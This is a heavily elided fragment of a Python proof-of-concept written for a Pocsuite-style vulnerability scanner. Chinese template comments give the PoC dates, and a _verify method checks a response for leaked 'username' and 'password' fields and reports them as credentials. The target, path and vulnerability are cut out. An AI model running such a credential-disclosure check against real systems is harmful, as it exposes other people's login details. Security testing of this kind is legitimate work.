...
class POC(POCBase):
    ...
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-11'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-11'  # 编写 PoC 的日期
    updateDate = '2023-08-11'  # PoC 更新的时间,默认和编写时间一样
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        try:
            ...
            if resq.status_code == 200 and ('username' in resq.text or 'password' in resq.text):
                username = json.loads(resq.text)['username']
                password = json.loads(resq.text)['password']
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = self.url + path
                result['VerifyInfo']['message'] = '用户名：'+username+' 密码：'+password
